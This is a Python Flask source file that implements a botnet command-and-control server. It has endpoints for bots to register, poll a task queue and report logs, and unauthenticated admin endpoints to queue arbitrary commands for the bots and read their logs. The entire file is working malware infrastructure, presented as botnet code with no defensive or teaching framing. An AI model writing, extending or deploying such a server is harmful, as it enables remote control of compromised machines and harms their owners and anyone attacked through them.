from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)

botnet_state = {
    "active_bots": [],
    "task_queue": [],
    "logs": []
}

@app.route('/register', methods=['POST'])
def register_bot():
    bot_id = request.json.get('bot_id')
    if bot_id not in botnet_state["active_bots"]:
        botnet_state["active_bots"].append(bot_id)
    return jsonify({"status": "registered"})

@app.route('/get_task/<bot_id>', methods=['GET'])
def get_task(bot_id):
    if botnet_state["task_queue"]:
        return jsonify({"task": botnet_state["task_queue"].pop(0)})
    return jsonify({"task": "IDLE"})

@app.route('/admin/send_command', methods=['POST'])
def send_command():
    command_data = request.json
    botnet_state["task_queue"].append(command_data)
    return jsonify({"status": "command_queued", "queue_size": len(botnet_state["task_queue"])})

@app.route('/report_log', methods=['POST'])
def report_log():
    log_entry = request.json
    log_entry['timestamp'] = datetime.datetime.now().strftime("%H:%M:%S")
    botnet_state["logs"].append(log_entry)
    if len(botnet_state["logs"]) > 50:
        botnet_state["logs"].pop(0)
    return jsonify({"status": "logged"})

@app.route('/admin/get_logs', methods=['GET'])
def get_logs():
    return jsonify(botnet_state["logs"])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)